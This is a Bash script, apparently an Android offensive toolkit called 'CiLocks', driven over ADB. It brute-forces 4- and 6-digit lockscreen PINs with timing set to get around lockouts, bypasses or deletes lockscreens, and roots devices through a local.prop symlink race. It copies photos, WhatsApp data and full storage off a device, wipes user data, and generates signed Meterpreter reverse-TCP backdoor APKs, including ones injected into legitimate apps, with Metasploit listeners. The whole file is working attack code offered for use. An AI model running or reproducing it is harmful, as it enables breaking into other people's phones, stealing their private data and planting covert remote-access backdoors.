#!/usr/bin/env bash
m="\e[0;31m" # merah
k="\e[0;33m" # kuning
h="\e[0;32m" # hijau
b="\e[0;34m" # biru
lm="\e[1;31m" # merah terang
lk="\e[1;33m" # kuning terang
lh="\e[1;32m" # hijau terang
lb="\e[1;34m" # langit biru
n="\e[0m" # netral
w="\e[1;37m" # putih tebal
clear
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "You must be root to run the script${n}"; echo ; exit 1; }
path=$(pwd)
name='cilocks'
function files() {
  file=$path/$name
  bash $file
}
clear
function banner() {

echo -e "${lb}
   _______ __               __
  / ____(_) /   ____  _____/ /_______
 / /   / / /   / __ \/ ___/ //_/ ___/
/ /___/ / /___/ /_/ / /__/ ,< (__  )
\____/_/_____/\____/\___/_/|_/____/
${n}"
echo -e "${m}   Crack Interface LockScreen${n}"
echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
echo -e "${lb}  Huawei Mod - Vincenzo Digilio${n}" 
}
banner
echo -e "${lh}
1.Update /PoC Ver/
2.Brute Pin 4 Digit /PoC Ver/
3.Brute Pin 6 Digit /PoC Ver/
4.--> POC Brute LockScreen Using 4 Digit Wordlist <--
5.Bypass LockScreen {Antiguard} Not Support All OS Version /PoC Ver/
6.Root Android {Supersu} Not Support All OS Version /PoC Ver/
7.Jump To Adb Toolkit /PoC Ver/
8.Reset Data /PoC Ver/
9.Remove LockScreen {Root} /PoC Ver/
10.Jump To Metasploit /PoC Ver/
99.Exit
${n}"
read -p "senpai@tegalsec:~# " select
if [[ $select == 1 ]]; then
    echo "This Latest Version!"
elif [[ $select == 2 ]]; then
  #adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82

  echo "Brute Pin 4 Digit"
  for i in {0000..9999}; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done

      adb shell input keyevent 66

      if ! (( `expr $i + 1` % 5 )); then
          adb shell input keyevent 66
          echo "Delay Limit 30s"
          sleep 30
          adb shell input keyevent 82
          adb shell input swipe 407 1211 378 85
      fi
  done

elif [[ $select == 3 ]]; then
  # adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82

  echo "Brute Pin 6 Digit"
  for i in {000000..999999}; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done

      adb shell input keyevent 66

      if ! (( `expr $i + 1` % 5 )); then
          adb shell input keyevent 66
          echo "Delay Limit 30s"
          secs=$((1 * 30))
          while [ $secs -gt 0 ]; do
             echo -ne "$secs\033[0K\r"
             sleep 1
             : $((secs--))
          done

          sleep 30
          adb shell input keyevent 82
          adb shell input swipe 407 1211 378 85
      fi
  done

elif [[ $select == 4 ]]; then
  # adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82 #KEYCODE_MENU accede alla maschera di Lock
  echo "Brute LockScreen Using 4 Digit Wordlist"
  read -p "list -> " files
  for i in `cat $files`; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done
         
          sleep 10 # Sleep se le 4 cifre sono errate lo smartphone torna in standby
          adb shell input keyevent 82 

     # if ! (( `expr $i + 1` % 5 )); then
     #     adb shell input keyevent 66
     #     echo "Delay Limit 30s"
     #     secs=$((1 * 30))
     #     while [ $secs -gt 0 ]; do
     #        echo -ne "$secs\033[0K\r"
     #        sleep 1
     #        : $((secs--))
     #     done

     #     sleep 30
     #     adb shell input keyevent 82
     #     adb shell input swipe 407 1211 378 85
     # fi
  done

elif [[ $select == 5 ]]; then
  adb shell pm list packages | grep io.kos.antiguard 2>/dev/null > /dev/null

isInstalled=$?


if [ $isInstalled -eq 0 ]; then
	adb uninstall io.kos.antiguard
else
	adb install ./AntiGuard/AntiGuard.apk
	adb shell am start io.kos.antiguard/.unlock
fi

elif [[ $select == 6 ]]; then
  adb restore modules/fakebackup.ab

command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"

if command "cat /data/local.prop"
	then echo "Succesfully rooted!"
	echo "Requires a reboot..."
	adb reboot
	sleep 2
	adb wait-for-device
	command "mount -o rw,remount /system"
	adb push modules/su-static /system/xbin/su
	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
	adb push modules/Superuser.apk /system/app/
	command "rm /data/local.prop"
	adb reboot
fi

elif [[ $select == 7 ]]; then
  clear
  function mmeta() {
    banner
    echo -e "${m}           Adb Toolkit${n}"
  }
  mmeta
  echo -e "${lh}
1.Shell
2.ScreenShot
3.Copy All Camera Photo
4.Copy All WhatsApp Folder
5.Copy All Data Storage
6.Manual Copy {Costum}
99.Menu
${n}  "
read -p "senpai@tegalsec:~# " select
  if [[ $select == 1 ]]; then
      echo "Opening Shell..."
      sleep 3
      adb shell
    elif [[ $select == 2 ]]; then
      export time=$(date +"%T")
      path=Files/Screenshot
      file=screenshoot-$time.png
      paths=$path/$file
      adb exec-out screencap -p > $file
      sudo mv $file $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 3 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=DCIM-$time
      paths=$path/$dir
      adb pull /sdcard/DCIM/ $path/$dir
      echo "Your File Saved In $paths "
    elif [[ $select == 4 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=WhatsApp-$time
      paths=$path/$dir
      adb pull /sdcard/WhatsApp/ $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 5 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=sdcard-$time
      paths=$path/$dir
      adb pull /sdcard/ $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 6 ]]; then
      echo "Ex: /sdcard/Document/"
      read -p "Enter Path: " pathz
      read -p "Enter Name Folder: " dir
      path=Files
      paths=$path/$dir
      adb pull $pathz $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 99 ]]; then
    files
    fi
elif [[ $select == 8 ]]; then
  echo -e "${lh}
  1.Fastboot
  2.Recovery
  ${n}"
  read -p "senpai@tegalsec:~# " select
  if [[ $select == 1 ]]; then
    adb reboot bootloader
    deviceConnected=konek
    	if [ "$(konek)" = 'NO' ]; then
    		echo "Waiting Phone..."
    		$adb wait-for-device
      fi
        fastboot devices
        fastboot erase userdata
        fastboot erase cache
   elif [[ $slect == 2 ]]; then
     deviceConnected=konek
     	if [ "$(konek)" = 'NO' ]; then
     		echo "Waiting Phone..."
     		$adb wait-for-device
       fi
       adb devices
       adb shell recovery --wipe_data
  else
    echo -e  "${m} Your Brain Error!${n}"
  fi

elif [[ $select == 9 ]]; then
  rem=$(adb shell su -c rm /data/system/*.key | adb reboot )
  echo $rem
  echo "success"



elif [[ $select == 10 ]]; then
  clear
  function mmeta() {
    banner
    echo -e "${m}   Metasploit Backdoor Generator${n}"
  }
  mmeta
echo -e "${lh}
1.Install Application
2.Create Payload Backdoor {Msfvenom} Singed
3.Run Metasploit
4.Inject Payload In Original Application
99.Menu
${n}"
read -p "senpai@tegalsec:~# " select
if [[ $select == 1 ]]; then
  read -p "Enter Ur Application: " app
  read -p "Run Application {Y/N}: " run
  if [ $run == "Y" ] || [ $run == "y" ]; then
     read -p "Enter Package Application Name: " pkg
     adb install $app
     adb shell am start $pkg/.unlock
  else
    adb install $app
  fi

elif [[ $select == 2 ]]; then
  path="backdoor"
  loli="loli.apk"
  read -p "Enter LHOST: " host
  read -p "Enter LPORT: " port
  read -p "Application Name: " app
  paths=$path/$loli
  echo -e "${lb}Wait Creating Backdoor...${n}"
  msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> $paths
  echo "Wait Installing Keystore..."
  sleep 5
  keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
  jarsigner -verify -verbose -certs $paths
  zipalign -v 4 $paths $path'/'$app'.apk'
  milf=$path/$app'.apk'
  rm $paths
  rm $path/key.keystore
  echo "Your Backdoor Created In" $milf
elif [[ $select == 3 ]]; then
  clear
  mmeta
  payload='android/meterpreter/reverse_tcp'
  echo -e "${m}
Payload => $payload ${n}${lh}
Listener
1.exploit/multi/handler {Default}
2.post/android/manage/remove_lock
3.post/android/manage/remove_lock_root
  ${n}"
  read -p "senpai@tegalsec:~# " select
  if [[ $select == 1 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use exploit/multi/handler'
    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  elif [[ $select == 2 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use post/android/manage/remove_lock'
    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  elif [[ $select == 3 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use post/android/manage/remove_lock_root'
    xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  fi
elif [[ $select == 4 ]]; then
  path="backdoor"
  loli="loli.apk"
  read -p "Enter LHOST: " host
  read -p "Enter LPORT: " port
  read -p "Enter Original Application: " ori
  read -p "Application Name: " app
  paths=$path/$loli
  echo -e "${lb}Wait Creating Backdoor...${n}"
  msfvenom --platform android -x $ori -p android/meterpreter/reverse_tcp lhost=$host lport=$port -o $paths

# if error,uncomment it

# echo "Wait Installing Keystore..."
  # sleep 5
  # keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
  # jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
  # jarsigner -verify -verbose -certs $paths
  # zipalign -v 4 $paths $path'/'$app'.apk'
  # milf=$path/$app'.apk'
  # rm $paths
  # rm $path/key.keystore
  echo "Your Backdoor Created In" $milf
elif [[ $select == 99 ]]; then
    files
fi

elif [[ $select == 99 ]]; then
    echo "oke"

else
  echo -e  "${m} Your Brain Error!${n}"
  fi
